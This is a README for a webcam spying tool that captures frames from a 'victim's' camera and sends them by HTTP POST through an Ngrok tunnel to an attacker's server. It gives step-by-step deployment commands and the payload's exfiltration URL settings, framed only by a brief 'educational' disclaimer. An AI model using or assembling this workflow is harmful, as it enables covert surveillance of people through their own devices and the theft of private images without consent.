# Webcam Capture & Exfiltration

## 📌 Project Overview
This project captures webcam frames from a target device and transmits them to a remote attacker-controlled server via Ngrok tunneling. The frames are processed and displayed on the attacker's machine in real time.

## 🚀 Features
- 📸 **Captures webcam frames** from the victim's device
- 📤 **Sends frames** to a remote server using HTTP POST requests
- 🌐 **Uses Ngrok** for secure tunneling
- 🎥 **Displays frames on the attacker's machine**
- 🛠 **Lightweight and efficient** frame transmission

## 📂 Project Structure
```
📁 webcam-capture-project
│-- 📜 payload.py (Runs on victim's device, captures webcam)
│-- 📜 server.py (Runs on attacker's machine, receives frames)
│-- 📜 README.md (Project documentation)
```

## 🛠 Setup & Usage
### 1️⃣ **Start the server on the attacker's machine**
```bash
python server.py
```

### 2️⃣ **Start Ngrok for tunneling**
```bash
ngrok http 8080
```
🔹 Copy the **HTTPS URL** from Ngrok (e.g., `https://random-id.ngrok.io`).

### 3️⃣ **Update the payload with the Ngrok URL**
Edit `payload.py` and replace:
```python
NGROK_URL = "https://your-ngrok-url.ngrok.io"
UPLOAD_URL = NGROK_URL + "/upload"
```

### 4️⃣ **Run the payload on the victim's device**
```bash
python payload.py
```

### 5️⃣ **Check the server for incoming frames**
You should see:
```
✅ Frame received! Size: XXXX bytes
```

## ⚠️ Disclaimer
This project is intended **for educational and ethical purposes only**. Unauthorized use against individuals or systems without permission is **illegal** and may result in severe consequences.

## 📌 Author
Developed as part of a cybersecurity learning project.

